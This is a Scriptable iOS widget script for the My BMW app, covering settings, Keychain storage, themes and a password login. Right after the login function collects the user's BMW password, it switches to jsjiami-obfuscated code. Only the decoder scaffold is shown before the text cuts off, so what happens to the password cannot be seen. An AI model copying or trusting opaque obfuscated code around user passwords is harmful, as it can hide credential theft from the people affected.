/**
 * app版本 ：android-3.1.1
 * UPTATE_TIM ：20230503
 * file_name ：bmw_scriptV3-release.js
 */
const RUNTIME_VERSION = 20201209;
const SOURCE_Project  ='[bmw-linker]';
const Project_UPDATE  ="https://github.com/erxiaowang417/Mybmw-Script"
const MODIFIER        = "erxiaowang"
 
class Base {
  constructor(arg = '') {
    this.arg = arg;
    this._actions = {};
    this.init();
  }
  init(widgetFamily = config.widgetFamily) {
    // 组件大小：small,medium,large
    this.widgetFamily = widgetFamily;
        // 系统设置的key，这里分为三个类型：
        // 1. 全局
        // 2. 不同尺寸的小组件
        // 3. 不同尺寸+小组件自定义的参数
        // 当没有key2时，获取key1，没有key1获取全局key的设置
        // this.SETTING_KEY = this.sm3(Script.name()+'@'+this.widgetFamily+"@"+this.arg)
        // this.SETTING_KEY1 = this.sm3(Script.name()+'@'+this.widgetFamily)
    this.SETTING_KEY = this.sm3(Script.name());
        // 文件管理器
        // 提示：缓存数据不要用这个操作，这个是操作源码目录的，缓存建议存放在local temp目录中
    this.FILE_MGR = FileManager[module.filename.includes('Documents/iCloud~') ? 'iCloud' : 'local']();
        // 本地，用于存储图片等
    this.FILE_MGR_LOCAL = FileManager.local();
    this.BACKGROUND_KEY = this.FILE_MGR_LOCAL.joinPath(
    this.FILE_MGR_LOCAL.documentsDirectory(),
      `bg_${this.SETTING_KEY}.jpg`
    );
        // this.BACKGROUND_KEY1 = this.FILE_MGR_LOCAL.joinPath(this.FILE_MGR_LOCAL.documentsDirectory(), `bg_${this.SETTING_KEY1}.jpg`)
        // this.BACKGROUND_KEY2 = this.FILE_MGR_LOCAL.joinPath(this.FILE_MGR_LOCAL.documentsDirectory(), `bg_${this.SETTING_KEY2}.jpg`)
        // // 插件设置
    this.settings = this.getSettings();
  }
    /**
     * 注册点击操作菜单
     * @param {string} name 操作函数名
     * @param {func} func 点击后执行的函数
     */
  registerAction(name, func) {
    this._actions[name] = func.bind(this);
  }
  /**
   * 生成操作回调URL，点击后执行本脚本，并触发相应操作
   * @param {string} name 操作的名称
   * @param {string} data 传递的数据
   */
  actionUrl(name = '', data = '') {
    let u = URLScheme.forRunningScript();
    let q = `act=${encodeURIComponent(name)}&data=${encodeURIComponent(data)}&__arg=${encodeURIComponent(
      this.arg
      )}&__size=${this.widgetFamily}`;
    let result = '';
    if (u.includes('run?')) {
      result = `${u}&${q}`;
    } else {
      result = `${u}?${q}`;
    }
    return result;
  }
  /**
   * sm3 字符串hash
   * @param {t} input
   */
  sm3(t){function n(t,n){return t.length>=n?t:new Array(n-t.length+1).join("0")+t}function r(t){let r="";for(let e=0;e<t.length/2;e++)r+=n(parseInt(t.substr(2*e,2),16).toString(2),8);return r}function e(t,n){return t.substring(n%t.length)+t.substr(0,n%t.length)}function u(t,n,r){const e=t||"",u=n||"",o=[];let f;for(let t=e.length-1;t>=0;t--)f=r(e[t],u[t],f),o[t]=f[0];return o.join("")}function o(t,n){return u(t,n,(t,n)=>[t===n?"0":"1"])}function f(t,n){return u(t,n,(t,n)=>["1"===t&&"1"===n?"1":"0"])}function s(t,n){return u(t,n,(t,n)=>["1"===t||"1"===n?"1":"0"])}function c(t,n){return u(t,n,(t,n,r)=>{const e=r?r[1]:"0";return t!==n?["0"===e?"1":"0",e]:[e,t]})}function i(t){return(...n)=>n.reduce((n,r)=>t(n,r))}function l(t){return i(o)(t,e(t,9),e(t,17))}function g(t,n,r,e){return e>=0&&e<=15?i(o)(t,n,r):i(s)(f(t,n),f(t,r),f(n,r))}function b(t,n,r,e){return e>=0&&e<=15?i(o)(t,n,r):s(f(t,n),f(u(t,void 0,t=>["1"===t?"0":"1"]),r))}function a(t,n){const u=[],f=[];for(let t=0;t<16;t++)u.push(n.substr(32*t,32));for(let t=16;t<68;t++)u.push(i(o)((s=i(o)(u[t-16],u[t-9],e(u[t-3],15)),i(o)(s,e(s,15),e(s,23))),e(u[t-13],7),u[t-6]));var s;for(let t=0;t<64;t++)f.push(o(u[t],u[t+4]));const a=[];for(let n=0;n<8;n++)a.push(t.substr(32*n,32));let h,d,p,S,j=a[0],v=a[1],$=a[2],A=a[3],I=a[4],m=a[5],w=a[6],y=a[7];for(let t=0;t<64;t++)d=o(h=e(i(c)(e(j,12),I,e(r((t=t)>=0&&t<=15?"79cc4519":"7a879d8a"),t)),7),e(j,12)),p=i(c)(g(j,v,$,t),A,d,f[t]),S=i(c)(b(I,m,w,t),y,h,u[t]),A=$,$=e(v,9),v=j,j=p,y=w,w=e(m,19),m=I,I=l(S);var P;return o([j,v,$,A,I,m,w,y].join(""),t)}const h=function(t){let r="";for(const e of t)r+=n(e.codePointAt(0).toString(2),8);return r}(t),d=h.length;let p=d%512;const S=`${h}1${n("",p=p>=448?512-p%448-1:448-p-1)}${n(d.toString(2),64)}`.toString(),j=(d+p+65)/512;let v=r("7380166f4914b2b9172442d7da8a0600a96f30bc163138aae38dee4db0fb0e4e");for(let t=0;t<=j-1;t++){v=a(v,S.substr(512*t,512))}return function(t){let r="";for(let e=0;e<t.length/8;e++)r+=n(parseInt(t.substr(8*e,8),2).toString(16),2);return r}(v).substring(0,32)}

  /**
    * 获取远程图片内容
    * @param {string} url 图片地址
    * @param {bool} useCache 是否使用缓存（请求失败时获取本地缓存）
    */
  async getImageByUrl(url, useCache = true) {
    const cacheKey = this.sm3(url);
    const cacheFile = FileManager.local().joinPath(FileManager.local().temporaryDirectory(), cacheKey);
    // 判断是否有缓存
    if (useCache && FileManager.local().fileExists(cacheFile)) {
      return Image.fromFile(cacheFile);
    }
    try {
      const req = new Request(url);
      const img = await req.loadImage();
      // 存储到缓存
      FileManager.local().writeImage(cacheFile, img);
      return img;
    } catch (e) {
    // 没有缓存+失败情况下，返回自定义的绘制图片（红色背景）
      throw new Error('加载图片失败');
    }
  }

  /**
   * 渲染标题内容
   * @param {object} widget 组件对象
   * @param {string} icon 图标地址
   * @param {string} title 标题内容
   * @param {bool|color} color 字体的颜色（自定义背景时使用，默认系统）
   */
  async renderHeader(widget, icon, title, color = false) {
    widget.addSpacer(10);
    let header = widget.addStack();
    header.centerAlignContent();
    let _icon = header.addImage(await this.getImageByUrl(icon));
    _icon.imageSize = new Size(14, 14);
    _icon.cornerRadius = 4;
    header.addSpacer(10);
    let _title = header.addText(title);
    if (color) _title.textColor = color;
    _title.textOpacity = 0.7;
    _title.font = Font.boldSystemFont(12);
    widget.addSpacer(10);
    return widget;
  }
  /**
   * 弹出一个通知
   * @param {string} title 通知标题
   * @param {string} body 通知内容
   * @param {string} url 点击后打开的URL
   */
  async notify(title, body, url = null, opts = {}) {
    let n = new Notification();
    n = Object.assign(n, opts);
    n.title = title;
    n.body = body;
   if (url) n.openURL = url;
   return await n.schedule();
  }
  /**
   * 给图片加一层半透明遮罩
   * @param {Image} img 要处理的图片
   * @param {string} color 遮罩背景颜色
   * @param {float} opacity 透明度
   */
  async shadowImage(img, color = '#000000', opacity = 0.7) {
    let ctx = new DrawContext();
    // 获取图片的尺寸
    ctx.size = img.size;
    ctx.drawImageInRect(img, new Rect(0, 0, img.size['width'], img.size['height']));
    ctx.setFillColor(new Color(color, opacity));
    ctx.fillRect(new Rect(0, 0, img.size['width'], img.size['height']));
    let res = await ctx.getImage();
    return res;
  }
  /**
   * 获取当前插件的设置
   * @param {boolean} json 是否为json格式
   */
  getSettings(json = true) {
    let res = json ? {} : '';
    let cache = '';
    // if (global && Keychain.contains(this.SETTING_KEY2)) {
    //   cache = Keychain.get(this.SETTING_KEY2)
    // } else if (Keychain.contains(this.SETTING_KEY)) {
    //   cache = Keychain.get(this.SETTING_KEY)
    // } else if (Keychain.contains(this.SETTING_KEY1)) {
    //   cache = Keychain.get(this.SETTING_KEY1)
    // } else if (Keychain.contains(this.SETTING_KEY2)){
    if (Keychain.contains(this.SETTING_KEY)) {
      cache = Keychain.get(this.SETTING_KEY);
    }
    if (json) {
      try {
        res = JSON.parse(cache);
      } catch (e) {}
    } else {
      res = cache;
    }
    return res;
  }
  /**
   * 存储当前设置
   * @param {bool} notify 是否通知提示
   */
  saveSettings(notify = true) {
    let res = typeof this.settings === 'object' ? JSON.stringify(this.settings) : String(this.settings);
    Keychain.set(this.SETTING_KEY, res);
    if (notify) this.notify('设置成功', '桌面组件稍后将自动刷新');
  }
}
// @base.end
// 运行环境
// @running.start
const Running = async (Widget, default_args = '') => {
  let M = null;
  // 判断hash是否和当前设备匹配
  if (config.runsInWidget) {
    M = new Widget(args.widgetParameter || '');
    const W = await M.render();
    Script.setWidget(W);
    Script.complete();
  } else {
    let {act, data, __arg, __size} = args.queryParameters;
    M = new Widget(__arg || default_args || '');
    if (__size) M.init(__size);
    if (!act || !M['_actions']) {
    // 弹出选择菜单
      const actions = M['_actions'];
      const _actions = [];
      const alert = new Alert();
      alert.title = M.name;
      alert.message = M.desc;
      for (let _ in actions) {
        alert.addAction(_);
        _actions.push(actions[_]);
      }
      alert.addCancelAction('取消操作');
      const idx = await alert.presentSheet();
      if (_actions[idx]) {
        const func = _actions[idx];
        await func();
      }
      return;
    }
    let _tmp = act
      .split('-')
      .map((_) => _[0].toUpperCase() + _.substr(1))
      .join('');
    let _act = `action${_tmp}`;
    if (M[_act] && typeof M[_act] === 'function') {
      const func = M[_act].bind(M);
      await func(data);
    }
  }
};

let WIDGET_FILE_NAME = 'bmw-linker.js';
let WIDGET_VERSION = 'v2.2.1';
let WIDGET_BUILD = '22050702';
let WIDGET_PREFIX = '[bmw-linker]';

let DEPENDENCIES = [];

let WIDGET_FONT = 'SF UI Display';
let WIDGET_FONT_BOLD = 'SF UI Display Bold';
let BMW_SERVER_HOST = 'https://myprofile.bmw.com.cn';
let APP_HOST_SERVER = 'https://bmw-linker.com';
const Authorurl="https://gitee.com/erxiaowang417/scriptable/raw/master/"  
let DEFAULT_BG_COLOR_LIGHT = '#FFFFFF';
let DEFAULT_BG_COLOR_DARK = '#2B2B2B';

// header is might be used for preventing the bmw block the external api?
let BMW_HEADERS = {
  'Content-Type': 'application/json; charset=utf-8',
  'Accept-Language': 'zh-CN',
  'x-user-agent': 'android(qp1a.190711.020.n960fxxs8fuc4);bmw;3.3.1(22432);cn'
};

// setup local storage keys
let REFRESH_TOKEN           = 'REFRESH_TOKEN';
let ACCESS_TOKEN            = 'ACCESS_TOKEN';
let VEHICLE_GCID            = 'VEHICLE_GCID';
let TOKEN_UPDATE_LAST_AT    = 'TOKEN_UPDATE_LAST_AT';
let LAST_CHECK_IN_AT        = 'LAST_CHECK_IN_AT';
let APP_USE_AGREEMENT       = 'APP_USE_AGREEMENT';
let VEHICLE_UPDATE_LAST_AT  = 'VEHICLE_UPDATE_LAST_AT';
let MY_BMW_VEHICLE_DATA     = 'MY_BMW_VEHICLE_DATA';
let MY_BMW_VEHICLE_VIN      = 'MY_BMW_VEHICLE_VIN';
let WIDGET_DANGER_COLOR     = '#ff0000';


class Widget extends Base {
  DeviceSize = {
    '428x926': {
        small: {width: 176, height: 176},
        medium: {width: 374, height: 176},
        large: {width: 374, height: 391}
    },
    '390x844': {
        small: {width: 161, height: 161},
        medium: {width: 342, height: 161},
        large: {width: 342, height: 359}
    },
    '414x896': {
        small: {width: 169, height: 169},
        medium: {width: 360, height: 169},
        large: {width: 360, height: 376}
    },
    '375x812': {
        small: {width: 155, height: 155},
        medium: {width: 329, height: 155},
        large: {width: 329, height: 345}
    },
    '414x736': {
        small: {width: 159, height: 159},
        medium: {width: 348, height: 159},
        large: {width: 348, height: 357}
    },
    '375x667': {
        small: {width: 148, height: 148},
        medium: {width: 322, height: 148},
        large: {width: 322, height: 324}
    },
    '320x568': {
        small: {width: 141, height: 141},
        medium: {width: 291, height: 141},
        large: {width: 291, height: 299}
    }
  };
  userConfigData = {
    username: '',
    password: '',
    custom_name: '',
    custom_vehicle_image: null,
    custom_logo_image: null,
    vin: '',
    map_api_key: null,
    show_control_checks: 0,
    force_dark_theme: null
  };

  appColorData = {
    light: {
        startColor: DEFAULT_BG_COLOR_LIGHT,
        endColor: DEFAULT_BG_COLOR_LIGHT,
        fontColor: DEFAULT_BG_COLOR_DARK
    },
    dark: {
        startColor: DEFAULT_BG_COLOR_DARK,
        endColor: DEFAULT_BG_COLOR_DARK,
        fontColor: DEFAULT_BG_COLOR_LIGHT
    }
  };

  constructor(arg) {
    super(arg);
    this.name = 'BMW-Linker ' + WIDGET_VERSION;
    this.desc = '宝马My BMW互联App小组件';
    // load settings
    this.userConfigData = {...this.userConfigData, ...this.settings['UserConfig']};
    let colorSettings = this.settings['AppColorConfig'];
    if (typeof colorSettings == 'string') {
      try {
        colorSettings = JSON.parse(colorSettings);
      } catch (e) {
        colorSettings = {};
      }
    }
    this.appColorData = {...this.appColorData, ...colorSettings};
    if (config.runsInApp) {
      this.registerAction('退出登录', this.userCleanAlert);
      this.registerAction('配置小组件', this.userConfigInput);
      this.registerAction('登录My BMW', this.userLoginInput);
    }
  }  

  async userLoginInput() {
    const confirmationAlert = new Alert();
    confirmationAlert.title = '郑重声明[完全免费]';
    confirmationAlert.message = `本代码来源:bmw-linker就版本无法登录,仅修改登录接口!\n\r\n小组件需要使用到您的BMW账号\n\r\n首次登录请配置账号、密码进行令牌获取\n\r\n小组件不会收集您的个人账户信息,所有账号信息将存在iCloud或者iPhone上但也请您妥善保管自己的账号\n\r\n小组件是开源、并且完全免费的,由BMW车主开发,所有责任与BMW公司无关\n\r\n请24小时内删除测试版本`;

    confirmationAlert.addAction('同意');
    confirmationAlert.addCancelAction('不同意');

    const userSelection = await confirmationAlert.presentAlert();
    if (userSelection == -1) {
      console.log('User denied');
      Keychain.set(APP_USE_AGREEMENT, 'false');
      return;
    }
    Keychain.set(APP_USE_AGREEMENT, 'true');

    return await this.userLoginCredentials();
  }

  async userCleanAlert() {
    const confirmationAlert = new Alert();

    confirmationAlert.title = '提示';
    confirmationAlert.message = '您的所有账户信息与设置将会从小组件中移除';

    confirmationAlert.addAction('退出登录');
    confirmationAlert.addCancelAction('取消');

    const userSelection = await confirmationAlert.presentAlert();
    if (userSelection == -1) {
      return;
    }

    try {
      if (this.SETTING_KEY && Keychain.contains(this.SETTING_KEY)) {
        Keychain.remove(this.SETTING_KEY);
      }
    } catch (e) {
      console.error('Clean User: ' + e.message);
    }

    try {
      let _fileKey = this.sm3(Script.name());
      if (_fileKey && Keychain.contains(_fileKey)) {
        Keychain.remove(_fileKey);
      }
    } catch (e) {
      console.error('Clean User: ' + e.message);
    }

    let vin = this.userConfigData.vin || '';

    let lastUpdateKey = vin + VEHICLE_UPDATE_LAST_AT;
    let localVehicleDataKey = vin + MY_BMW_VEHICLE_DATA;

    let keyStoreArray = [
      LAST_CHECK_IN_AT,
      REFRESH_TOKEN,
      VEHICLE_GCID,
      ACCESS_TOKEN,
      TOKEN_UPDATE_LAST_AT,
      VEHICLE_UPDATE_LAST_AT,
      APP_USE_AGREEMENT,
      lastUpdateKey,
      localVehicleDataKey,
      MY_BMW_VEHICLE_VIN
    ];
    for (const key of keyStoreArray) {
      try {
        if (Keychain.contains(key)) {
          Keychain.remove(key);
        }
      } catch (e) {}
    }

    this.notify('退出成功', '账户设置信息已经从小组件中删除');
  }

  async userLoginCredentials() {
    const userLoginAlert = new Alert();
    userLoginAlert.title = '配置BMW登录';
    userLoginAlert.message = '使用密码授权登录';

    userLoginAlert.addTextField('账号(您的电话)', this.userConfigData['username']);

    userLoginAlert.addAction('确认密码登录');
    userLoginAlert.addCancelAction('取消');

    const id = await userLoginAlert.presentAlert();

    if (id == -1) {
      return;
    }

    this.userConfigData['username'] = this.formatUserMobile(userLoginAlert.textFieldValue(0));

    return this.myBMWLogin();
  }
  formatUserMobile(mobileStr) {
    // remove all non numerical char
    mobileStr = mobileStr.replace(/\D/g, '');
    if (mobileStr.startsWith('86')) {
       return mobileStr;
    }
    if (mobileStr.length == 11) {
      return '86' + mobileStr;
    }
    return mobileStr;
  }
  async userConfigInput() {
    const userCustomConfigAlert = new Alert();
    userCustomConfigAlert.title = '自定义小组件';
    userCustomConfigAlert.message = '以下可以不用填写，留空信息会从系统自动获取';

    // refer to default config
    let configSet = {
        custom_name: '自定义车名（默认自动获取）',
        custom_vehicle_image: '车辆图片URL（默认自动获取）',
        custom_logo_image: 'LOGO URL(默认自动获取）',
        vin: '车架号(多辆BMW时填写)',
        map_api_key: '高德地图API_KEY（非必要）',
        force_dark_theme: '总是深色主题（是or否）'
    };

    for (const key in configSet) {
        if (!configSet[key] || !this.userConfigData.hasOwnProperty(key)) {
            continue;
        }

        if (key == 'force_dark_theme') {
            userCustomConfigAlert.addTextField(configSet[key], this.userConfigData[key] ? '是' : null);
            continue;
        }

        userCustomConfigAlert.addTextField(configSet[key], this.userConfigData[key]);
    }

    userCustomConfigAlert.addCancelAction('跳过');
    userCustomConfigAlert.addAction('下一步');

    let result = await userCustomConfigAlert.presentAlert();

    if (result == -1) {
        return;
    }

    // start to get data
    for (const key in configSet) {
        if (!configSet[key] || !this.userConfigData.hasOwnProperty(key)) {
            continue;
        }

        let index = Object.keys(configSet).indexOf(key);
        this.userConfigData[key] = userCustomConfigAlert.textFieldValue(index);

        if (key != 'custom_name') {
            this.userConfigData[key] = this.userConfigData[key].replace(' ', '');
        }
        if (key == 'force_dark_theme') {
            this.userConfigData[key] = this.userConfigData[key] && this.userConfigData[key] == '是';
        }
    }

    // write to local
    this.settings['UserConfig'] = this.userConfigData;
    this.saveSettings(false);

    await this.controlCheckSetup();
    await this.colorSetPickUp();
  }
  async colorSetPickUp() {
    const colorSetPickup = new Alert();
    colorSetPickup.title = '选取背景颜色';
    colorSetPickup.message = `请根据车辆颜色选取背景`;
    let systemColorSet = {
      白色: {
        light: {
          startColor: '#c7c7c7',
          endColor: '#fff',
          fontColor: '#1d1d1d'
        },
        dark: {
          startColor: '#232323',
          endColor: '#5b5d61',
          fontColor: '#fff'
        }
      },
      黑色: {
        light: {
          startColor: '#5e627d',
          endColor: '#fff',
          fontColor: '#1d1d1d'
        },
        dark: {
          startColor: '#2d2f40',
          endColor: '#666878',
          fontColor: '#fff'
        }
      },
      蓝色: {
        light: {
          startColor: '#6887d1',
          endColor: '#fff',
          fontColor: '#1d1d1d'
        },
        dark: {
          startColor: '#23345e',
          endColor: '#526387',
          fontColor: '#fff'
        }
      },
      红色: {
        light: {
          startColor: '#b16968',
          endColor: '#fff',
          fontColor: '#1d1d1d'
        },
        dark: {
          startColor: '#a84242',
          endColor: '#540101',
          fontColor: '#fff'
        }
      },
      橙色: {
        light: {
          startColor: '#ffc699',
          endColor: '#fff',
          fontColor: '#1d1d1d'
        },
        dark: {
          startColor: '#bd5608',
          endColor: '#732600',
          fontColor: '#fff'
        }
      }
    };

    for (const key in systemColorSet) {
      colorSetPickup.addAction(key);
    }
      // last index alway be the custom
    colorSetPickup.addAction('自定义');
    const userSelection = await colorSetPickup.presentAlert();
      // start to get data
    for (const key in systemColorSet) {
      if (!systemColorSet[key]) {
        continue;
      }
      let index = Object.keys(systemColorSet).indexOf(key);
      if (index == userSelection) {
        this.settings['AppColorConfig'] = systemColorSet[key];
        }
    }
    if (userSelection >= Object.keys(systemColorSet).length) {
      this.settings['AppColorConfig'] = await this.colorConfigInput();
    }
      // write to local
    this.saveSettings();
  }
  async controlCheckSetup() {
    const controlCheckAlert = new Alert();
    controlCheckAlert.title = '是否显示车辆检查';
    controlCheckAlert.message = '是否显示额外的车辆检查信息？\n\r\n如机油保养、轮胎压力检查或者ALL GOOD。';
    controlCheckAlert.addAction('不显示');
    // last index alway be the custom
    controlCheckAlert.addAction('显示所有检查信息');
    controlCheckAlert.addAction('只显示ALL GOOD');
    const userSelection = await controlCheckAlert.presentAlert();
    this.userConfigData['show_control_checks'] = Number(userSelection);
    this.settings['UserConfig'] = this.userConfigData;
    // write to local
    this.saveSettings(false);
  }
  async colorConfigInput() {
    const bgColorAlert = new Alert();
    bgColorAlert.title = '配置背景颜色';
    bgColorAlert.message = '请输入16进制RBG颜色代码, 留空小组件将自动从系统获取';
    bgColorAlert.addTextField('顶部颜色（如#FFFFFF）', this.appColorData['light']['startColor']);
    bgColorAlert.addTextField('底部颜色（如#FFFFFF）', this.appColorData['light']['endColor']);
    bgColorAlert.addTextField('字体颜色（如#000000）', this.appColorData['light']['fontColor']);
    bgColorAlert.addAction('确定');
    bgColorAlert.addCancelAction('取消');
    const id = await bgColorAlert.presentAlert();
    if (id == -1) 
      return this.appColorData;
    let appColorConfig = {
      startColor: bgColorAlert.textFieldValue(0),
      endColor: bgColorAlert.textFieldValue(1),
      fontColor: bgColorAlert.textFieldValue(2)
    };
    return {light: appColorConfig, dark: appColorConfig};
  }

  async render() {
    // check all dependencies
    await this.renderError('载入中...');
    if (
      (!this.userConfigData.username || this.userConfigData.username == '') &&
      (!this.userConfigData.custom_name || this.userConfigData.custom_name == '')
    ) {
      return await this.renderError('请先配置用户');
    }
    let data = await this.getData();
    if (
        !data &&
        (!this.userConfigData.username || this.userConfigData.username == '') &&
        this.userConfigData.custom_name &&
        this.userConfigData.custom_name != ''
    ) {
        // put default data
        data = {
          state: {
            doorsState : {
              combinedSecurityState : "SECURED",
            },
            lastUpdatedAt: new Date(),
            combustionFuelLevel : {
              range : 888,
              remainingFuelPercent : 99
            },
            currentMileage : 1234,
          }
        };
      }
      if (!data) {
          return await this.renderError('获取车辆信息失败，请检查授权');
      }
      // start to render if we get information
      try {
          let screenSize = Device.screenResolution();
          let scale = Device.screenScale();
          data.size =
            this.DeviceSize[`${screenSize.width/scale}x${screenSize.height/scale}`] ||
            this.DeviceSize['375x812'];
      } catch (e) {
        console.warn('Display Error: ' + e.message);
        await this.renderError('显示错误：' + e.message);
      }
      if(this.widgetFamily == 'small'){
        return await this.renderSmall(data,args.widgetParameter);
      }else{
        switch (this.widgetFamily) {
          case 'large':
            return await this.renderLarge(data);
          case 'medium':
            return await this.renderMedium(data);
          default:
            break;   
        }
      }
  }

  validColorString(colorStr) {
    return colorStr && colorStr.search('#') == 0 && (colorStr.length == 4 || colorStr.length == 7); // TODO: change to regex
  }
  async renderError(errMsg) {
    let w = new ListWidget();
    w.backgroundGradient = this.getBackgroundColor();

    const padding = 16;
    w.setPadding(padding, padding, padding, padding);
    w.addStack().addText(errMsg);
    return w;
  }
  getFontColor() {
      if (this.userConfigData.force_dark_theme) {
          return Color.white();
      }
      if (this.validColorString(this.appColorData.light.fontColor)) {
          return Color.dynamic(
              new Color(this.appColorData['light']['fontColor'], 1),
              new Color(this.appColorData['dark']['fontColor'], 1)
          );
      }
      return Color.dynamic(new Color('#2B2B2B', 1), Color.white());
  }
  getBackgroundColor() {
    const bgColor = new LinearGradient();
    let startColor = Color.dynamic(new Color(DEFAULT_BG_COLOR_LIGHT, 1), new Color(DEFAULT_BG_COLOR_DARK, 1));
    let endColor = Color.dynamic(new Color(DEFAULT_BG_COLOR_LIGHT, 1), new Color(DEFAULT_BG_COLOR_DARK, 1));
    try {
      if (this.userConfigData.force_dark_theme) {
        startColor = new Color(this.appColorData['dark']['startColor'], 1);
        endColor = new Color(this.appColorData['dark']['endColor'], 1);
      } else if (
        this.appColorData.light.startColor != DEFAULT_BG_COLOR_LIGHT ||
        this.appColorData.light.endColor != DEFAULT_BG_COLOR_LIGHT
      ) {
      // if user override
        if (
          this.validColorString(this.appColorData['light'].startColor) &&
          this.validColorString(this.appColorData['light'].endColor)
        ) {
          startColor = Color.dynamic(
            new Color(this.appColorData['light']['startColor'], 1),
            new Color(this.appColorData['dark']['startColor'], 1)
          );
          endColor = Color.dynamic(
            new Color(this.appColorData['light']['endColor'], 1),
            new Color(this.appColorData['dark']['endColor'], 1)
          );
        }
      }
      } catch (e) {
        console.error(e.message);
      }
      bgColor.colors = [startColor, endColor];
      bgColor.locations = [0.0, 1.0];
      return bgColor;
  }

  
//
  myBMWLogin= async function() {
    const userLoginAlert = new Alert();
    userLoginAlert.title = '配置BMW登录';
    userLoginAlert.message = '使用密码授权登录';
    userLoginAlert.addTextField(`密码(请谨慎保管!)`, null);
    userLoginAlert.addTextField(`作者${MODIFIER}`, null);
    userLoginAlert.addAction('确定');
    userLoginAlert.addCancelAction('取消'); 
    const id = await userLoginAlert.presentAlert();
    if (id == -1) {
      return 0; 
    }
    let pwdCode = userLoginAlert.textFieldValue(0);

  ///////////////////////////////////////     

    var version_='jsjiami.com.v7';const _0x35782a=_0x1493;(function(_0x18a648,_0x23b62e,_0x5074fb,_0x44d5a5,_0x23120a,_0x5085fd,_0x2e6289){return _0x18a648=_0x18a648>>0x8,_0x5085fd='hs',_0x2e6289='hs',function(_0x30cf7d,_0x1593c7,_0x4071c8,_0x272ba0,_0x3a155f){const _0x5cfc88=_0x1493;_0x272ba0='tfi',_0x5085fd=_0x272ba0+_0x5085fd,_0x3a155f='up',_0x2e6289+=_0x3a155f,_0x5085fd=_0x4071c8(_0x5085fd),_0x2e6289=_0x4071c8(_0x2e6289),_0x4071c8=0x0;const _0x5ebf18=_0x30cf7d();while(!![]&&--_0x44d5a5+_0x1593c7){try{_0x272ba0=-parseInt(_0x5cfc88(0x1bf,'^Cqg'))/0x1+parseInt(_0x5cfc88(0x1e0,']gS&'))/0x2+-parseInt(_0x5cfc88(0x1ed,'[QFK'))/0x3+-parseInt(_0x5cfc88(0x1ab,'YwHx'))/0x4*(parseInt(_0x5cfc88(0x1bd,'*Jb!'))/0x5)+-parseInt(_0x5cfc88(0x1e6,'qzKc'))/0x6+-parseInt(_0x5cfc88(0x1fb,'i6uB'))/0x7*(-parseInt(_0x5cfc88(0x1d1,'qI#6'))/0x8)+parseInt(_0x5cfc88(0x1dc,'PQ52'))/0x9*(parseInt(_0x5cfc88(0x1fc,'b6^V'))/0xa);}catch(_0x3b4753){_0x272ba0=_0x4071c8;}finally{_0x3a155f=_0x5ebf18[_0x5085fd]();if(_0x18a648<=_0x44d5a5)_0x4071c8?_0x23120a?_0x272ba0=_0x3a155f:_0x23120a=_0x3a155f:_0x4071c8=_0x3a155f;else{if(_0x4071c8==_0x23120a['replace'](/[xKRqnMtJUSXhFVufWAeD=]/g,'')){if(_0x272ba0===_0x1593c7){_0x5ebf18['un'+_0x5085fd](_0x3a155f);break;}_0x5ebf18[_0x2e6289](_0x3a155f);}}}}}(_0x5074fb,_0x23b62e,function(_0x174c4a,_0x56a731,_0x115410,_0x2d7832,_0x329ee1,_0xb0e641,_0x3235a7){return _0x56a731='\x73\x70\x6c\x69\x74',_0x174c4a=arguments[0x0],_0x174c4a=_0x174c4a[_0x56a731](''),_0x115410='\x72\x65\x76\x65\x72\x73\x65',_0x174c4a=_0x174c4a[_0x115410]('\x76'),_0x2d7832='\x6a\x6f\x69\x6e',(0x1298aa,_0x174c4a[_0x2d7832](''));});}(0xcc00,0x6bd10,_0x19f4,0xce),_0x19f4)&&(version_=_0x19f4);function _0x1493(_0x18e635,_0x31da85){const _0x19f465=_0x19f4();return _0x1493=function(_0x149334,_0x76b7ce){_0x149334=_0x149334-0x1a7;let _0x368739=_0x19f465[_0x149334];if(_0x1493['klHBBA']===undefined){var _0x6d8450=function(_0xce86d){const _0x29358b='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x2bec2e='',_0x383991='';for(let _0x8227b0=0x0,_0x4f4687,_0x46155b,_0xcdc850=0x0;_0x46155b=_0xce86d['charAt'](_0xcdc850++);~_0x46155b&&(_0x4f4687=_0x8227b0%0x4?_0x4f4687*0x40+_0x46155b:_0x46155b,_0x8227b0++%0x4)?_0x2bec2e+=String['fromCharCode'](0xff&_0x4f4687>>(-0x2*_0x8227b0&0x6)):0x0){_0x46155b=_0x29358b['indexOf'](_0x46155b);}for(let _0x3ba20f=0x0,_0x1a50f9=_0x2bec2e['length'];_0x3ba20f<_0x1a50f9;_0x3ba20f++){_0x383991+='%'+('00'+_0x2bec2e['charCodeAt'](_0x3ba20f)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x383991);};const _0x488b75=function(_0x375010,_0xeb2c1d){let _0x51777d=[],_0x2e0a73=0x0,_0x53a6e1,_0x2aca48='';_0x375010=_0x6d8450(_0x375010);let _0x2e5441;for(_0x2e5441=0x0;_0x2e5441<0x100;_0x2e5441++){_0x51777d[_0x2e5441]=_0x2e5441;}for(_0x2e5441=0x0;_0x2e5441<0x100;_0x2e5441++){_0x2e0a73=(_0x2e0a73+_0x51777d[_0x2e5441]+_0xeb2c1d['charCodeAt'](_0x2e5441%_0xeb2c1d['length']))%0x100,_0x53a6e1=_0x51777d[_0x2e5441],_0x51777d[_0x2e5441]=_0x51777d[_0x2e0a73],_0x51777d[_0x2e0a73]=_0x53a6e1;}_0x2e5441=0x0,_0x2e0a73=0x0;for(let _0x101d9f=0x0;_0x101d9f<_0x375010['length'];_0x101d9f++){_0x2e5441=(_0x2e5441+0x1)%0x100,_0x2e0a73=(_0x2e0a73+_0x51777d[_0x2e5441])%0x100,_0x53a6e1=_0x51777d[_0x2e5441],_0x51777d[_0x2e5441]=_0x51777d[_0x2e0a73],_0x51777d[_0x2e0a73]=_0x53a6e1,_0x2aca48+=String['fromCharCode'](_0x375010['charCodeAt'](_0x101d9f)^_0x51777d[(_0x51777d[_0x2e5441]+_0x51777d[_0x2e0a73])%0x100]);}return _0x2aca48;};_0x1493['ICXHLH']=_0x488b75,_0x18e635=arguments,_0x1493['klHBBA']=!![];}const _0xeeb0e9=_0x19f465[0x0],_0x4c99db=_0x149334+_0xeeb0e9,_0x53c876=_0x18e635[_0x4c99db];return!_0x53c876?(_0x1493['HybTOc']===undefined&&(_0x1493['HybTOc']=!![]),_0x368739=_0x1493['ICXHLH'](_0x368739,_0x76b7ce),_0x18e635[_0x4c99db]=_0x368739):_0x368739=_0x53c876,_0x368739;},_0x1493(_0x18e635,_0x31da85);}const 